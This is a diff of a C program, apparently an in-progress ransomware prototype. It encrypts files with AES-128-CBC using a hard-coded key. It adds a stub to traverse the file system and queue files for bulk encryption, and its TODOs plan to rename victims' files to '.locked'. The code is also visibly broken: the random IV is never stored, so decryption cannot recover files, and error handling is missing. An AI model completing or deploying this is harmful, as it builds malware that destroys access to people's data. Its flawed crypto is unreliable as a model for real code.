@@ -4,7 +4,13 @@
 #include <openssl/evp.h>
 #include <openssl/rand.h>
 
-void encrypt_file(char *file, unsigned char* key, unsigned char* iv){
+void traverse(const char *path) {
+    // TODO: schould traverse the file system, starting with path and stock the path in a queue.
+}
+
+void encrypt_file(char *file, unsigned char* key) {
+    unsigned char iv[16];
+    RAND_bytes(iv, sizeof(iv));
 
     EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
     EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
@@ -29,7 +35,7 @@ void encrypt_file(char *file, unsigned char* key, unsigned char* iv){
             char *tmp = realloc(buffer, capacity);
             
             if (tmp == NULL) { 
-                /* handle error */ 
+                /* should handle error */ 
             }
             buffer = tmp; 
         }
@@ -50,14 +56,14 @@ void encrypt_file(char *file, unsigned char* key, unsigned char* iv){
     EVP_EncryptFinal_ex(ctx, buffer + size, &outlen);
     fwrite(buffer, 1, size + outlen, out);
     
-    // TODO: schould rename the file to .locked
+    // TODO: should rename the file to .locked
 
     free(buffer);
     EVP_CIPHER_CTX_free(ctx);
     fclose(out);
 }
 
-void decrypt_file(char *file, unsigned char* key){
+void decrypt_file(char *file, unsigned char* key) {
     FILE *in = fopen(file, "rb");
     if (in == NULL){
         printf("cannot locked file"); 
@@ -84,7 +90,7 @@ void decrypt_file(char *file, unsigned char* key){
             char *tmp = realloc(buffer, capacity);
             
             if (tmp == NULL) { 
-                /* handle error */ 
+                /* should handle error */ 
             }
             buffer = tmp; 
         }
@@ -103,24 +109,26 @@ void decrypt_file(char *file, unsigned char* key){
     EVP_DecryptFinal_ex(ctx, buffer, &outlen);
     fwrite(buffer, 1, size + outlen, out);
     
-    // TODO: schould rename the file (remove .locked)
+    // TODO: should rename the file (remove .locked)
 
     free(buffer);
     EVP_CIPHER_CTX_free(ctx);
     fclose(out);
 }
 
-int main()
-{
-    unsigned char iv[16];
+int main() {
+    
     //RAND_bytes(key, sizeof(key));
-    RAND_bytes(iv, sizeof(iv));
     unsigned char key[16] = "qwertyuiopasdfgh";
-
     char *file = "sample.pdf";
 
-    encrypt_file(file, key, iv);
+    /* TODO: pull the queue to encrypt
+    while (queue != null) {
+        encrypt_file(file, key);
+    }
+    */
+    encrypt_file(file, key);
     //decrypt_file(file, key);
 
-    return 0;
+    return 0; 
 }
